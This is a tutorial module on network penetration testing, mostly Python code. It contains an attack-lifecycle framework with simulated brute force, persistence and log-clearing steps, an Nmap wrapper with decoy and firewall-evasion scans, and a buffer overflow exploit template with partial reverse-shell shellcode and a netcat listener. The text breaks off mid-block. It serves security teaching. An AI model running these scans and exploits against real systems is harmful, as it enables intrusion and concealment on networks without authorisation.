# Network Penetration Testing

## 🎯 Learning Objectives

In this module, you will learn the fundamentals, methodologies, and practical applications of network penetration testing.

### 📚 Theoretical Knowledge
- Network penetration testing methodologies
- Network reconnaissance techniques
- Vulnerability scanning and assessment
- Exploit development and usage
- Post-exploitation techniques
- Lateral movement strategies

### 🛠️ Practical Skills
- Advanced network scanning with Nmap
- Metasploit Framework usage
- Custom exploit development
- Privilege escalation techniques
- Network pivoting
- Steganography and data hiding

### 🔧 Technical Competencies
- TCP/IP protocol analysis
- Wireless network penetration
- VPN and tunnel analysis
- Active Directory attacks
- SNMP and network service exploitation
- Traffic analysis and packet crafting

### 🌐 Real-world Applications
- Enterprise network security assessment
- Red team operations
- Compliance testing (PCI DSS, SOX)
- Critical infrastructure protection

## 📖 Fundamental Concepts

### Network Penetration Testing Lifecycle

```python
#!/usr/bin/env python3
"""
Network Penetration Testing Lifecycle Framework
Author: ibrahimsql
Description: Systematic network penetration testing processes
"""

import subprocess
import json
import xml.etree.ElementTree as ET
from datetime import datetime
import ipaddress
import socket
import threading
import time

class NetworkPentestFramework:
    def __init__(self, target_network):
        self.target_network = target_network
        self.discovered_hosts = []
        self.open_ports = {}
        self.vulnerabilities = []
        self.exploited_hosts = []
        self.report_data = {
            'start_time': datetime.now().isoformat(),
            'target': target_network,
            'phases': {}
        }
    
    def phase_1_reconnaissance(self):
        """Phase 1: Reconnaissance and Information Gathering"""
        print("[+] Phase 1: Reconnaissance starting...")
        
        # Passive reconnaissance
        passive_info = self.passive_reconnaissance()
        
        # Active reconnaissance
        active_info = self.active_reconnaissance()
        
        self.report_data['phases']['reconnaissance'] = {
            'passive': passive_info,
            'active': active_info,
            'timestamp': datetime.now().isoformat()
        }
        
        return passive_info, active_info
    
    def passive_reconnaissance(self):
        """Passive reconnaissance techniques"""
        info = {
            'dns_enumeration': [],
            'whois_data': {},
            'search_engine_recon': [],
            'social_media_intel': []
        }
        
        # DNS enumeration
        try:
            # DNS zone transfer attempt
            dns_servers = self.find_dns_servers()
            for dns_server in dns_servers:
                zone_data = self.attempt_zone_transfer(dns_server)
                if zone_data:
                    info['dns_enumeration'].append({
                        'server': dns_server,
                        'zone_data': zone_data
                    })
        except Exception as e:
            print(f"[-] DNS enumeration error: {e}")
        
        return info
    
    def active_reconnaissance(self):
        """Active reconnaissance techniques"""
        info = {
            'host_discovery': [],
            'port_scanning': {},
            'service_enumeration': {},
            'os_fingerprinting': {}
        }
        
        # Host discovery
        self.discovered_hosts = self.discover_hosts()
        info['host_discovery'] = self.discovered_hosts
        
        # Port scanning for each discovered host
        for host in self.discovered_hosts:
            ports = self.port_scan(host)
            self.open_ports[host] = ports
            info['port_scanning'][host] = ports
            
            # Service enumeration
            services = self.enumerate_services(host, ports)
            info['service_enumeration'][host] = services
            
            # OS fingerprinting
            os_info = self.os_fingerprint(host)
            info['os_fingerprinting'][host] = os_info
        
        return info
    
    def discover_hosts(self):
        """Discover active hosts in the network"""
        hosts = []
        network = ipaddress.ip_network(self.target_network, strict=False)
        
        print(f"[+] Performing host discovery on {network} network...")
        
        # Ping sweep
        for ip in network.hosts():
            if self.ping_host(str(ip)):
                hosts.append(str(ip))
                print(f"[+] Active host found: {ip}")
        
        return hosts
    
    def ping_host(self, host):
        """Ping a host to check if it's alive"""
        try:
            result = subprocess.run(
                ['ping', '-c', '1', '-W', '1000', host],
                capture_output=True,
                text=True,
                timeout=5
            )
            return result.returncode == 0
        except:
            return False
    
    def port_scan(self, host):
        """Perform port scan on a host"""
        print(f"[+] Port scanning: {host}")
        
        try:
            # Use nmap for port scanning
            result = subprocess.run(
                ['nmap', '-sS', '-T4', '--top-ports', '1000', host],
                capture_output=True,
                text=True,
                timeout=300
            )
            
            # Parse nmap output for open ports
            open_ports = []
            lines = result.stdout.split('\n')
            
            for line in lines:
                if '/tcp' in line and 'open' in line:
                    port = line.split('/')[0].strip()
                    open_ports.append(int(port))
            
            return open_ports
        except:
            return []
    
    def enumerate_services(self, host, ports):
        """Enumerate services on open ports"""
        services = {}
        
        for port in ports:
            try:
                # Service detection with nmap
                result = subprocess.run(
                    ['nmap', '-sV', '-p', str(port), host],
                    capture_output=True,
                    text=True,
                    timeout=60
                )
                
                # Parse service information
                lines = result.stdout.split('\n')
                for line in lines:
                    if f'{port}/tcp' in line:
                        parts = line.split()
                        if len(parts) >= 3:
                            services[port] = {
                                'service': parts[2],
                                'version': ' '.join(parts[3:]) if len(parts) > 3 else 'unknown'
                            }
                        break
            except:
                services[port] = {'service': 'unknown', 'version': 'unknown'}
        
        return services
    
    def os_fingerprint(self, host):
        """Perform OS fingerprinting"""
        try:
            result = subprocess.run(
                ['nmap', '-O', '--osscan-guess', host],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            # Parse nmap output for OS info
            lines = result.stdout.split('\n')
            os_info = []
            
            for line in lines:
                if 'OS details:' in line or 'Running:' in line:
                    os_info.append(line.strip())
            
            return os_info
        except:
            return ["OS detection failed"]
    
    def phase_2_scanning(self):
        """Phase 2: Scanning and Enumeration"""
        print("[+] Phase 2: Scanning & Enumeration starting...")
        
        scanning_results = {
            'vulnerability_scan': {},
            'service_enumeration': {},
            'web_enumeration': {},
            'smb_enumeration': {}
        }
        
        for host in self.discovered_hosts:
            # Vulnerability scanning
            vulns = self.vulnerability_scan(host)
            scanning_results['vulnerability_scan'][host] = vulns
            
            # Detailed service enumeration
            if 80 in self.open_ports.get(host, []) or 443 in self.open_ports.get(host, []):
                web_enum = self.web_enumeration(host)
                scanning_results['web_enumeration'][host] = web_enum
            
            if 445 in self.open_ports.get(host, []) or 139 in self.open_ports.get(host, []):
                smb_enum = self.smb_enumeration(host)
                scanning_results['smb_enumeration'][host] = smb_enum
        
        self.report_data['phases']['scanning'] = {
            'results': scanning_results,
            'timestamp': datetime.now().isoformat()
        }
        
        return scanning_results
    
    def vulnerability_scan(self, host):
        """Perform vulnerability scanning"""
        vulnerabilities = []
        
        try:
            # Nmap vulnerability scripts
            result = subprocess.run(
                ['nmap', '--script', 'vuln', host],
                capture_output=True,
                text=True,
                timeout=300
            )
            
            # Parse vulnerability results
            lines = result.stdout.split('\n')
            current_vuln = None
            
            for line in lines:
                if '|' in line and 'CVE-' in line:
                    vulnerabilities.append(line.strip())
                elif 'VULNERABLE:' in line:
                    vulnerabilities.append(line.strip())
        
        except Exception as e:
            vulnerabilities.append(f"Vulnerability scan error: {e}")
        
        return vulnerabilities
    
    def web_enumeration(self, host):
        """Web service enumeration"""
        web_info = {
            'directories': [],
            'technologies': [],
            'forms': [],
            'cookies': []
        }
        
        try:
            # Directory enumeration with common paths
            common_dirs = ['admin', 'login', 'backup', 'config', 'test', 'dev', 'api']
            
            for directory in common_dirs:
                url = f"http://{host}/{directory}"
                if self.check_web_path(url):
                    web_info['directories'].append(directory)
        
        except Exception as e:
            web_info['error'] = str(e)
        
        return web_info
    
    def check_web_path(self, url):
        """Check if web path exists"""
        try:
            import urllib.request
            response = urllib.request.urlopen(url, timeout=5)
            return response.getcode() == 200
        except:
            return False
    
    def smb_enumeration(self, host):
        """SMB service enumeration"""
        smb_info = {
            'shares': [],
            'users': [],
            'os_info': ''
        }
        
        try:
            # SMB share enumeration
            result = subprocess.run(
                ['smbclient', '-L', host, '-N'],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            lines = result.stdout.split('\n')
            for line in lines:
                if 'Disk' in line or 'IPC' in line:
                    smb_info['shares'].append(line.strip())
        
        except Exception as e:
            smb_info['error'] = str(e)
        
        return smb_info
    
    def phase_3_gaining_access(self):
        """Phase 3: Gaining Access"""
        print("[+] Phase 3: Gaining Access starting...")
        
        exploitation_results = {
            'successful_exploits': [],
            'failed_attempts': [],
            'shells_obtained': []
        }
        
        for host in self.discovered_hosts:
            # Exploit attempts based on discovered vulnerabilities
            exploits = self.attempt_exploitation(host)
            exploitation_results['successful_exploits'].extend(exploits['successful'])
            exploitation_results['failed_attempts'].extend(exploits['failed'])
            
            if exploits['successful']:
                self.exploited_hosts.append(host)
                exploitation_results['shells_obtained'].append(host)
        
        self.report_data['phases']['gaining_access'] = {
            'results': exploitation_results,
            'timestamp': datetime.now().isoformat()
        }
        
        return exploitation_results
    
    def attempt_exploitation(self, host):
        """Attempt exploitation against host"""
        results = {
            'successful': [],
            'failed': []
        }
        
        # Common exploit attempts
        exploits_to_try = [
            self.try_ssh_bruteforce,
            self.try_web_exploits,
            self.try_smb_exploits,
            self.try_service_exploits
        ]
        
        for exploit_func in exploits_to_try:
            try:
                success = exploit_func(host)
                if success:
                    results['successful'].append({
                        'host': host,
                        'exploit': exploit_func.__name__,
                        'timestamp': datetime.now().isoformat()
                    })
                else:
                    results['failed'].append({
                        'host': host,
                        'exploit': exploit_func.__name__,
                        'reason': 'Exploit failed'
                    })
            except Exception as e:
                results['failed'].append({
                    'host': host,
                    'exploit': exploit_func.__name__,
                    'reason': str(e)
                })
        
        return results
    
    def try_ssh_bruteforce(self, host):
        """SSH brute force attempt"""
        if 22 not in self.open_ports.get(host, []):
            return False
        
        # Common credentials
        credentials = [
            ('admin', 'admin'),
            ('root', 'root'),
            ('admin', 'password'),
            ('user', 'user')
        ]
        
        for username, password in credentials:
            try:
                # SSH connection attempt (simulated)
                print(f"[*] SSH brute force attempt: {username}:{password}@{host}")
                # In real scenario, use paramiko or similar
                time.sleep(0.1)  # Rate limiting
            except:
                continue
        
        return False  # Simulated failure
    
    def try_web_exploits(self, host):
        """Web exploit attempts"""
        if not any(port in [80, 443, 8080] for port in self.open_ports.get(host, [])):
            return False
        
        # Common web exploits
        web_exploits = [
            'SQL Injection',
            'XSS',
            'Directory Traversal',
            'File Upload'
        ]
        
        for exploit in web_exploits:
            print(f"[*] Web exploit attempt: {exploit} on {host}")
            # Simulated exploit attempt
            time.sleep(0.1)
        
        return False  # Simulated failure
    
    def try_smb_exploits(self, host):
        """SMB exploit attempts"""
        if not any(port in [139, 445] for port in self.open_ports.get(host, [])):
            return False
        
        print(f"[*] SMB exploit attempt: {host}")
        # EternalBlue, SMBGhost and similar exploits
        return False  # Simulated failure
    
    def try_service_exploits(self, host):
        """Other service exploits"""
        for port in self.open_ports.get(host, []):
            print(f"[*] Service exploit attempt: {host}:{port}")
            # Port-specific exploits
        
        return False  # Simulated failure
    
    def phase_4_maintaining_access(self):
        """Phase 4: Maintaining Access"""
        print("[+] Phase 4: Maintaining Access starting...")
        
        persistence_results = {
            'backdoors_installed': [],
            'persistence_mechanisms': [],
            'privilege_escalation': []
        }
        
        for host in self.exploited_hosts:
            # Install persistence mechanisms
            persistence = self.install_persistence(host)
            persistence_results['persistence_mechanisms'].extend(persistence)
            
            # Privilege escalation
            privesc = self.privilege_escalation(host)
            persistence_results['privilege_escalation'].extend(privesc)
        
        self.report_data['phases']['maintaining_access'] = {
            'results': persistence_results,
            'timestamp': datetime.now().isoformat()
        }
        
        return persistence_results
    
    def install_persistence(self, host):
        """Install persistence mechanisms"""
        mechanisms = []
        
        # Simulated persistence installation
        persistence_types = [
            'Registry modification',
            'Service installation',
            'Scheduled task',
            'Startup folder'
        ]
        
        for mechanism in persistence_types:
            print(f"[*] Installing persistence: {mechanism} on {host}")
            mechanisms.append({
                'host': host,
                'type': mechanism,
                'status': 'simulated',
                'timestamp': datetime.now().isoformat()
            })
        
        return mechanisms
    
    def privilege_escalation(self, host):
        """Privilege escalation attempts"""
        escalations = []
        
        # Common privilege escalation techniques
        techniques = [
            'Kernel exploits',
            'SUID binaries',
            'Sudo misconfigurations',
            'Service exploits'
        ]
        
        for technique in techniques:
            print(f"[*] Privilege escalation attempt: {technique} on {host}")
            escalations.append({
                'host': host,
                'technique': technique,
                'status': 'attempted',
                'timestamp': datetime.now().isoformat()
            })
        
        return escalations
    
    def phase_5_covering_tracks(self):
        """Phase 5: Covering Tracks"""
        print("[+] Phase 5: Covering Tracks starting...")
        
        cleanup_results = {
            'logs_cleared': [],
            'files_removed': [],
            'registry_cleaned': []
        }
        
        for host in self.exploited_hosts:
            cleanup = self.cleanup_evidence(host)
            cleanup_results['logs_cleared'].extend(cleanup['logs'])
            cleanup_results['files_removed'].extend(cleanup['files'])
            cleanup_results['registry_cleaned'].extend(cleanup['registry'])
        
        self.report_data['phases']['covering_tracks'] = {
            'results': cleanup_results,
            'timestamp': datetime.now().isoformat()
        }
        
        return cleanup_results
    
    def cleanup_evidence(self, host):
        """Clean up evidence"""
        cleanup = {
            'logs': [],
            'files': [],
            'registry': []
        }
        
        # Simulated cleanup operations
        print(f"[*] Cleaning tracks: {host}")
        
        cleanup['logs'].append({
            'host': host,
            'log_type': 'System logs',
            'action': 'cleared',
            'timestamp': datetime.now().isoformat()
        })
        
        cleanup['files'].append({
            'host': host,
            'file_type': 'Temporary files',
            'action': 'removed',
            'timestamp': datetime.now().isoformat()
        })
        
        return cleanup
    
    def generate_report(self):
        """Generate penetration test report"""
        self.report_data['end_time'] = datetime.now().isoformat()
        self.report_data['summary'] = {
            'total_hosts_discovered': len(self.discovered_hosts),
            'total_hosts_exploited': len(self.exploited_hosts),
            'total_vulnerabilities': len(self.vulnerabilities),
            'success_rate': len(self.exploited_hosts) / len(self.discovered_hosts) if self.discovered_hosts else 0
        }
        
        # Save report to file
        report_filename = f"network_pentest_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(report_filename, 'w') as f:
            json.dump(self.report_data, f, indent=2)
        
        print(f"[+] Report generated: {report_filename}")
        return report_filename
    
    def run_full_pentest(self):
        """Run complete penetration test process"""
        print("[+] Network Penetration Test starting...")
        print(f"[+] Target network: {self.target_network}")
        
        try:
            # Phase 1: Reconnaissance
            self.phase_1_reconnaissance()
            
            # Phase 2: Scanning
            self.phase_2_scanning()
            
            # Phase 3: Gaining Access
            self.phase_3_gaining_access()
            
            # Phase 4: Maintaining Access
            self.phase_4_maintaining_access()
            
            # Phase 5: Covering Tracks
            self.phase_5_covering_tracks()
            
            # Generate report
            report_file = self.generate_report()
            
            print("[+] Penetration test completed!")
            return report_file
            
        except Exception as e:
            print(f"[-] Penetration test error: {e}")
            return None

# Usage example
if __name__ == "__main__":
    # Define target network (use only in test environment!)
    target_network = "192.168.1.0/24"
    
    # Start penetration test framework
    pentest = NetworkPentestFramework(target_network)
    
    # Run full penetration test
    report = pentest.run_full_pentest()
    
    if report:
        print(f"[+] Penetration test report: {report}")
```

## 🔍 Advanced Network Scanning Techniques

### Advanced Scanning with Nmap

```python
#!/usr/bin/env python3
"""
Advanced Nmap Scanning Tools
Author: ibrahimsql
Description: Advanced network scanning techniques with Nmap
"""

import subprocess
import xml.etree.ElementTree as ET
import json
from datetime import datetime
import threading
import queue

class AdvancedNmapScanner:
    def __init__(self):
        self.scan_results = {}
        self.scan_queue = queue.Queue()
        self.threads = []
    
    def stealth_scan(self, target):
        """Stealth SYN scan"""
        print(f"[+] Starting stealth SYN scan: {target}")
        
        cmd = [
            'nmap',
            '-sS',  # SYN scan
            '-T2',  # Slow timing
            '-f',   # Fragment packets
            '--randomize-hosts',
            '--data-length', '25',
            target
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return self.parse_nmap_output(result.stdout)
        except Exception as e:
            return {'error': str(e)}
    
    def comprehensive_scan(self, target):
        """Comprehensive scan"""
        print(f"[+] Starting comprehensive scan: {target}")
        
        cmd = [
            'nmap',
            '-sS', '-sU',  # TCP SYN + UDP scan
            '-A',          # Aggressive scan
            '-T4',         # Aggressive timing
            '-p-',         # All ports
            '--script', 'default,vuln',
            '-oX', f'scan_{target.replace("/", "_")}.xml',
            target
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=1800)
            return self.parse_nmap_output(result.stdout)
        except Exception as e:
            return {'error': str(e)}
    
    def service_version_scan(self, target):
        """Service version scan"""
        print(f"[+] Service version scan: {target}")
        
        cmd = [
            'nmap',
            '-sV',         # Version detection
            '--version-intensity', '9',
            '-T4',
            target
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return self.parse_nmap_output(result.stdout)
        except Exception as e:
            return {'error': str(e)}
    
    def os_detection_scan(self, target):
        """Operating system detection scan"""
        print(f"[+] OS detection scan: {target}")
        
        cmd = [
            'nmap',
            '-O',          # OS detection
            '--osscan-guess',
            '--max-os-tries', '2',
            target
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return self.parse_nmap_output(result.stdout)
        except Exception as e:
            return {'error': str(e)}
    
    def vulnerability_scan(self, target):
        """Vulnerability scan"""
        print(f"[+] Vulnerability scan: {target}")
        
        cmd = [
            'nmap',
            '--script', 'vuln',
            '--script-args', 'unsafe=1',
            '-T4',
            target
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=900)
            return self.parse_nmap_output(result.stdout)
        except Exception as e:
            return {'error': str(e)}
    
    def firewall_evasion_scan(self, target):
        """Firewall evasion scan"""
        print(f"[+] Firewall evasion scan: {target}")
        
        cmd = [
            'nmap',
            '-sS',
            '-f',          # Fragment packets
            '-D', 'RND:10', # Decoy scan
            '--source-port', '53',
            '--data-length', '25',
            '--randomize-hosts',
            '-T2',
            target
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return self.parse_nmap_output(result.stdout)
        except Exception as e:
            return {'error': str(e)}
    
    def parse_nmap_output(self, output):
        """Parse Nmap output"""
        parsed_data = {
            'hosts': [],
            'scan_info': {},
            'timestamp': datetime.now().isoformat()
        }
        
        lines = output.split('\n')
        current_host = None
        
        for line in lines:
            line = line.strip()
            
            # Host information
            if 'Nmap scan report for' in line:
                if current_host:
                    parsed_data['hosts'].append(current_host)
                
                current_host = {
                    'ip': line.split()[-1].strip('()'),
                    'hostname': '',
                    'ports': [],
                    'os': [],
                    'services': []
                }
            
            # Port information
            elif '/tcp' in line or '/udp' in line:
                if current_host:
                    port_info = line.split()
                    if len(port_info) >= 3:
                        current_host['ports'].append({
                            'port': port_info[0],
                            'state': port_info[1],
                            'service': port_info[2] if len(port_info) > 2 else 'unknown'
                        })
            
            # OS information
            elif 'OS details:' in line or 'Running:' in line:
                if current_host:
                    current_host['os'].append(line)
        
        # Add last host
        if current_host:
            parsed_data['hosts'].append(current_host)
        
        return parsed_data
    
    def threaded_scan(self, targets, scan_type='stealth'):
        """Multi-threaded scanning"""
        print(f"[+] Starting threaded scan for {len(targets)} targets...")
        
        # Add targets to queue
        for target in targets:
            self.scan_queue.put(target)
        
        # Start worker threads
        for i in range(min(5, len(targets))):
            thread = threading.Thread(target=self.scan_worker, args=(scan_type,))
            thread.start()
            self.threads.append(thread)
        
        # Wait for all threads to complete
        for thread in self.threads:
            thread.join()
        
        return self.scan_results
    
    def scan_worker(self, scan_type):
        """Thread worker function"""
        while not self.scan_queue.empty():
            try:
                target = self.scan_queue.get(timeout=1)
                
                if scan_type == 'stealth':
                    result = self.stealth_scan(target)
                elif scan_type == 'comprehensive':
                    result = self.comprehensive_scan(target)
                elif scan_type == 'service':
                    result = self.service_version_scan(target)
                elif scan_type == 'os':
                    result = self.os_detection_scan(target)
                elif scan_type == 'vuln':
                    result = self.vulnerability_scan(target)
                else:
                    result = self.stealth_scan(target)
                
                self.scan_results[target] = result
                self.scan_queue.task_done()
                
            except queue.Empty:
                break
            except Exception as e:
                print(f"[-] Scanning error: {e}")
    
    def generate_scan_report(self, output_file='scan_report.json'):
        """Generate scan report"""
        report = {
            'scan_timestamp': datetime.now().isoformat(),
            'total_targets': len(self.scan_results),
            'results': self.scan_results,
            'summary': self.generate_summary()
        }
        
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"[+] Scan report generated: {output_file}")
        return output_file
    
    def generate_summary(self):
        """Generate scan summary"""
        summary = {
            'total_hosts_scanned': len(self.scan_results),
            'hosts_with_open_ports': 0,
            'total_open_ports': 0,
            'common_services': {},
            'potential_vulnerabilities': 0
        }
        
        for target, result in self.scan_results.items():
            if 'error' not in result and 'hosts' in result:
                for host in result['hosts']:
                    if host['ports']:
                        summary['hosts_with_open_ports'] += 1
                        summary['total_open_ports'] += len(host['ports'])
                        
                        for port in host['ports']:
                            service = port.get('service', 'unknown')
                            summary['common_services'][service] = summary['common_services'].get(service, 0) + 1
        
        return summary

# Usage example
if __name__ == "__main__":
    scanner = AdvancedNmapScanner()
    
    # Single target scan
    target = "192.168.1.1"
    result = scanner.stealth_scan(target)
    print(json.dumps(result, indent=2))
    
    # Multiple target scan
    targets = ["192.168.1.1", "192.168.1.2", "192.168.1.3"]
    results = scanner.threaded_scan(targets, 'stealth')
    
    # Generate report
    scanner.generate_scan_report('network_scan_report.json')
```

## 🎯 Exploit Development and Usage

### Buffer Overflow Exploit Development

```python
#!/usr/bin/env python3
"""
Buffer Overflow Exploit Development Framework
Author: ibrahimsql
Description: Framework for exploiting buffer overflow vulnerabilities
"""

import struct
import socket
import time
from pwn import *

class BufferOverflowExploit:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.offset = 0
        self.bad_chars = []
        self.return_address = 0
        self.shellcode = b""
    
    def find_offset(self, pattern_length=1000):
        """Find EIP offset"""
        print("[+] Finding EIP offset...")
        
        # Create cyclic pattern
        pattern = cyclic(pattern_length)
        
        try:
            # Connect to target service
            conn = remote(self.target_ip, self.target_port)
            
            # Send pattern
            conn.send(pattern)
            
            # Wait for crash
            time.sleep(2)
            conn.close()
            
            # Manually check EIP value
            print("[*] Service crashed. Check EIP value manually.")
            print(f"[*] Pattern: {pattern[:100]}...")
            
        except Exception as e:
            print(f"[-] Offset finding error: {e}")
    
    def set_offset(self, offset):
        """Set EIP offset"""
        self.offset = offset
        print(f"[+] EIP offset set: {offset}")
    
    def find_bad_characters(self):
        """Find bad characters"""
        print("[+] Finding bad characters...")
        
        # Create string with all characters
        all_chars = b""
        for i in range(1, 256):
            all_chars += struct.pack("B", i)
        
        # Create buffer
        buffer = b"A" * self.offset
        buffer += b"BBBB"  # EIP
        buffer += all_chars
        
        try:
            conn = remote(self.target_ip, self.target_port)
            conn.send(buffer)
            time.sleep(2)
            conn.close()
            
            print("[*] Characters sent. Check ESP manually.")
            print("[*] Missing or altered characters are bad characters.")
            
        except Exception as e:
            print(f"[-] Bad character finding error: {e}")
    
    def set_bad_characters(self, bad_chars):
        """Set bad characters"""
        self.bad_chars = bad_chars
        print(f"[+] Bad characters set: {[hex(c) for c in bad_chars]}")
    
    def find_jmp_esp(self):
        """Find JMP ESP address"""
        print("[+] Finding JMP ESP address...")
        print("[*] Use Mona.py or ROPgadget to find JMP ESP address:")
        print("[*] !mona jmp -r esp -cpb \"\\x00\\x0a\\x0d\"")
        print("[*] ROPgadget --binary program.exe --only 'jmp|call' | grep esp")
    
    def set_return_address(self, address):
        """Set return address"""
        self.return_address = address
        print(f"[+] Return address set: {hex(address)}")
    
    def generate_shellcode(self, payload_type='reverse_shell', lhost='192.168.1.100', lport=4444):
        """Generate shellcode"""
        print(f"[+] Generating {payload_type} shellcode...")
        
        if payload_type == 'reverse_shell':
            # Windows reverse shell shellcode (generated with msfvenom)
            # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f python -b "\x00\x0a\x0d"
            shellcode = (
                b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
                b"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
                # ... (actual shellcode would go here)
            )
        elif payload_type == 'bind_shell':
            # Bind shell shellcode
            shellcode = b"\x90" * 100  # NOP sled + shellcode
        else:
            # Calc.exe shellcode (for testing)
            shellcode = (
                b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
                b"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
            )
        
        # Check for bad characters
        for bad_char in self.bad_chars:
            if bad_char in shellcode:
                print(f"[-] Warning: Shellcode contains bad character: {hex(bad_char)}")
        
        self.shellcode = shellcode
        print(f"[+] Shellcode generated ({len(shellcode)} bytes)")
        return shellcode
    
    def create_exploit_buffer(self):
        """Create exploit buffer"""
        if not self.offset or not self.return_address or not self.shellcode:
            print("[-] Error: Missing offset, return address, or shellcode!")
            return None
        
        # Create buffer
        buffer = b"A" * self.offset
        buffer += struct.pack("<L", self.return_address)  # EIP
        buffer += b"\x90" * 16  # NOP sled
        buffer += self.shellcode
        
        print(f"[+] Exploit buffer created ({len(buffer)} bytes)")
        return buffer
    
    def test_exploit(self):
        """Test exploit"""
        print("[+] Testing exploit...")
        
        buffer = self.create_exploit_buffer()
        if not buffer:
            return False
        
        try:
            conn = remote(self.target_ip, self.target_port)
            conn.send(buffer)
            
            # Wait for shellcode to execute
            time.sleep(3)
            
            # Test connection
            try:
                response = conn.recv(1024, timeout=2)
                print(f"[+] Response received: {response}")
                return True
            except:
                print("[*] No response, but exploit may have worked")
                return True
                
        except Exception as e:
            print(f"[-] Exploit test error: {e}")
            return False
        finally:
            try:
                conn.close()
            except:
                pass
    
    def run_exploit(self):
        """Run exploit"""
        print("[+] Running exploit...")
        
        buffer = self.create_exploit_buffer()
        if not buffer:
            return False
        
        try:
            # Start listener (for reverse shell)
            if 'reverse' in str(self.shellcode):
                print("[*] Start reverse shell listener:")
                print("[*] nc -lvp 4444")
                input("[*] Press Enter when listener is ready...")
            
            # Send exploit
            conn = remote(self.target_ip, self.target_port)
            conn.send(buffer)
            
            print("[+] Exploit sent!")
            
            if 'bind' in str(self.shellcode):
                # Connect to bind shell
                time.sleep(2)
                shell_conn = remote(self.target_ip, 4444)
                shell_conn.interactive()
            
            return True
            
        except Exception as e:
            print(f"[-] Exploit execution error: {e}")
            return False

# Usage example
if __name__ == "__main__":
```